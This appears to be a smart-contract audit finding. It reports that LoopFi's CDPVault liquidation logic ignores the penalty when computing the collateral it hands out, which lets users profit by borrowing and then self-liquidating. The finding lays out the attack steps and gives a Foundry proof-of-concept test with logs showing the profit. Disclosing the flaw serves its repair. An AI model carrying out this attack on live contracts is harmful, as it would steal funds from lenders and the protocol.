## [H] Liquidation doesn't account for penalty when calculating collateral to give, allowing users to profit by borrowing and self-liquidating

`CDPVault` allows users to borrow `underlying` from `PoolV3` by depositing collateral into the vault, such that the `(collateral value of their position / liquidationRatio) >= their current total debt`.

Users must repay their debt fully via `CDPVault::repay`, and the amount must cover their entire `current total debt`, which also includes various interest factors. If the value of their collateral divided by `liquidationRatio` is less than the debt of their position, then their position is considered `unsafe` and anyone can `liquidate` the position by buying the collateral at a `discount`. The amount spent by the caller is used to cover for the debt.

To ensure that users cannot profit from self liquidations, the `liquidatePosition` function incorporates a penalty mechanism, that is intended to deduct fees from the payment amount, which subsequently goes to the protocol as profit.

The problem is that when the `liquidatePosition` function calculates the collateral to give to the caller, it utilizes the the repay amount *without* the penalty, essentially functioning as if there is no penalty mechanism at all. The caller can specify any `repay amount`, and the collateral they receive will correspond directly to `repay amount / discount`, with no penalty.

This allows malicious users to profit by `deposit collateral -> borrow WETH -> have their position become unsafe -> buy collateral with WETH at a discount`. Malicious users can profit and steal funds from lenders and the protocol.

> The natspec for the `CDPVault::liquidatePosition` states that "From that repay amount a penalty (`liquidationPenalty`) is subtracted to mitigate against profitable self liquidations." 

However, we will see in the PoC how this has no impact against profitable self liquidations

### Proof of Concept

The following block is executed when users repay their debt:

[CDPVault.sol#L402-L426](repos/2024-07-loopfi/src/CDPVault.sol#L402-L426)

```javascript
    } else if (deltaDebt < 0) {
@>      uint256 maxRepayment = calcTotalDebt(debtData);
        uint256 amount = abs(deltaDebt);
        if (amount >= maxRepayment) {
            amount = maxRepayment; // U:[CM-11]
            deltaDebt = -toInt256(maxRepayment);
        }

        poolUnderlying.safeTransferFrom(creditor, address(pool), amount);

        uint128 newCumulativeQuotaInterest;
        if (amount == maxRepayment) {
            newDebt = 0;
            newCumulativeIndex = debtData.cumulativeIndexNow;
            profit = debtData.accruedInterest;
            newCumulativeQuotaInterest = 0;
        } else {
            (newDebt, newCumulativeIndex, profit, newCumulativeQuotaInterest) = calcDecrease(
                amount, // delta debt
                position.debt,
                debtData.cumulativeIndexNow, // current cumulative base interest index in Ray
                position.cumulativeIndexLastUpdate,
                debtData.cumulativeQuotaInterest
            );
        }
```

For users to completely repay their loan, they must pay `maxRepayment` amount, which is calculated via a call to `calcTotalDebt`.

If the position is unsafe (`collateral value / liquidation ratio < total debt`), then anyone can liquidate it for a discount:

[CDPVault.sol#L521-L532](repos/2024-07-loopfi/src/CDPVault.sol#L521-L532)

```javascript
        // load price and calculate discounted price
        uint256 spotPrice_ = spotPrice();
@>      uint256 discountedPrice = wmul(spotPrice_, liqConfig_.liquidationDiscount);
        if (spotPrice_ == 0) revert CDPVault__liquidatePosition_invalidSpotPrice();
        // Ensure that there's no bad debt
        if (calcTotalDebt(debtData) > wmul(position.collateral, spotPrice_)) revert CDPVault__BadDebt();

        // compute collateral to take, debt to repay and penalty to pay
@>      uint256 takeCollateral = wdiv(repayAmount, discountedPrice);
        uint256 deltaDebt = wmul(repayAmount, liqConfig_.liquidationPenalty);
        uint256 penalty = wmul(repayAmount, WAD - liqConfig_.liquidationPenalty);
```

There is also a penalty that the liquidator must pay (deducted from `repayAmount`). This is to mitigate profits from self-liquidation, as stated by the natspec of this function:

[CDPVault.sol#L503-L504](repos/2024-07-loopfi/src/CDPVault.sol#L503-L504)

```javascript
    /// ... From that repay amount a penalty (`liquidationPenalty`) is subtracted to mitigate against
    /// profitable self liquidations ...
```

So the actual amount of debt repaid by the liquidator is `repayAmount - penalty`:

[CDPVault.sol#L538-L539](repos/2024-07-loopfi/src/CDPVault.sol#L538-L539)

```javascript
    // transfer the repay amount from the liquidator to the vault
    poolUnderlying.safeTransferFrom(msg.sender, address(pool), repayAmount - penalty);
```

In the same call, the `penalty` is also transferred to the pool, taken as a profit for the protocol.

[CDPVault.sol#L567-L569](repos/2024-07-loopfi/src/CDPVault.sol#L567-L569)

```javascript
     // Mint the penalty from the vault to the treasury
        poolUnderlying.safeTransferFrom(msg.sender, address(pool), penalty);
        IPoolV3Loop(address(pool)).mintProfit(penalty);
```

However, there is a critical problem here. We can see that the intention here is that the caller pays `repayAmount - penalty` for the debt, and that the penalty goes towards profit.

This can be confirmed by observing the amount of debt that is covered via repayment:

[CDPVault.sol#L530](repos/2024-07-loopfi/src/CDPVault.sol#L530)

```javascript
     uint256 deltaDebt = wmul(repayAmount, liqConfig_.liquidationPenalty);
```

Note that `repayAmount * liqConfig_.liquidationPenalty` is equivalent to `repayAmount - penalty`. So the debt reduced is `repayAmount - penalty`. The problem is that the *collateral sent to the caller does not incorporate the penalty for liquidation*.

Essentially, this makes the `penalty` redundant, because the caller still receives the full `repayAmount` of collateral specified, including a `discount`.

A malicious user can perform the following attack scenario:

1. Deposit collateral via `CDPVault::deposit`.
2. Borrow WETH via `CDPVault::borrow`.
3. Have their position become unsafe (i.e., wait until enough debt interest is accrued such that `(collateral value of their position / liquidationRatio) < their current total debt`).
4. Fully buy back collateral at a discount.

### Coded PoC

Note: The value of the discount and penalty were chosen by observing the values currently set in `scripts/config.js`, they were not chosen arbitrarily.

Add the following to `test/unit/CDPVault.t.sol` and run `forge test --mt testSelfLiquidateProfit -vv`:

```javascript
    function testSelfLiquidateProfit() public {
        mockWETH.mint(address(this), 20e18);

        // discount = 0.98 ether (0.02% discount)
        // penalty = 0.99 ether (0.01% penalty)
        CDPVault vault = createCDPVault(token, 150 ether, 0, 1.25 ether, 0.99 ether, 0.98 ether);
        createGaugeAndSetGauge(address(vault));

        // create position
        uint256 wethBefore = mockWETH.balanceOf(address(this));
        _modifyCollateralAndDebt(vault, 100 ether, 80 ether);
        uint256 wethBorrowed = mockWETH.balanceOf(address(this)) - wethBefore;
        uint256 collateralDeposited = 100 ether;
        console.log("weth borrowed: ", wethBorrowed);
        console.log("collateral deposited: ", collateralDeposited);
        
        address position = address(this);
        uint256 amountUserMustRepay = vault.virtualDebt(position);
        console.log("Amount of debt user must repay: ", amountUserMustRepay);

        // any attempt to liquidate now will revert because position is safe
        vm.expectRevert(bytes4(keccak256("CDPVault__liquidatePosition_notUnsafe()")));
        vault.liquidatePosition(position, 1 ether);

        // user waits some time for price to change so position becomes unsafe (but no bad debt yet)
        // in reality, interest will accrue, however to make this PoC simple we will update spot price (which is another way user can take advantage)
        _updateSpot(0.80 ether);
        (uint256 collateral, uint256 debt , , , , ) = vault.positions(position);

        // calculate amount to repay to fully liquidate position.
        uint256 spotAmt = oracle.spot(address(token));
        uint256 discountPercent = 0.98 ether;
        uint256 discountAmount = wmul(spotAmt, discountPercent);
        uint256 repayFull = wmul(collateral, discountAmount);
        console.log("Amount user is repaying: ", repayFull);
        mockWETH.approve(address(vault), repayFull);

        // fully liquidate position
        wethBefore = mockWETH.balanceOf(address(this));
        uint collateralBefore = token.balanceOf(address(this));
        vault.liquidatePosition(position, repayFull);
        uint256 wethSpent = wethBefore - mockWETH.balanceOf(address(this));
        uint256 collateralReceived = token.balanceOf(address(this)) - collateralBefore;
        console.log("weth spent: ", wethSpent);
        console.log("collateral received: ", collateralReceived);
        
        console.log("Total WETH earned: ", wethBorrowed - wethSpent);
        console.log("collateral lost: ", collateralDeposited -  collateralReceived);

        // confirm that collateral in position is 0
        (collateral, debt, , , , ) = vault.positions(position);
        console.log("collateral remaining in position: ", collateral);
    }
```

```text
[PASS] testSelfLiquidateProfit() (gas: 3761322)
Logs:
  weth borrowed:  80000000000000000000
  collateral deposited:  100000000000000000000
  Amount of debt user must repay:  80000000000000000000
  Amount user is repaying:  78400000000000000000
  weth spent:  78400000000000000000
  collateral received:  100000000000000000000
  Total WETH earned:  1600000000000000000
  collateral lost:  0
  collateral remaining in position:  0

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.46ms

Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

As displayed in the coded PoC, since the user receives the full amount of collateral without the penalty applied to the amount they receive, the user profits 1.6e18 WETH with the attack scenario described above.



